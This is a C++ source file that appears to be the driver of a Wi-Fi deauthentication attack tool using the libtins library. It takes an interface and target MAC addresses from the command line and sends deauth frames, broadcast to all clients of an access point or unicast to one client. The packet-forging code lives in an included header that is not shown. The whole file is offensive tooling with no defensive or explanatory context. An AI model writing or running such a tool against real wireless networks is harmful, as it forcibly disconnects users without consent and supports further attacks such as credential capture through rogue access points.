#include <iostream>
#include "deauth.h"

using namespace std;
using namespace Tins;

int main(int argc, char *argv[])
{
    if (argc < 3)
        usage(argv[0]);
    class deauth myDeauth;
    if (argc >= 4)  // Uni Casting
        myDeauth.setAddr((Dot11::address_type)argv[3], (Dot11::address_type)argv[2]);
    else            // Broad Casting
        myDeauth.setAddr((Dot11::address_type)argv[2]);

    myDeauth.sendDeAuth(argv[1]);
    return 0;
}
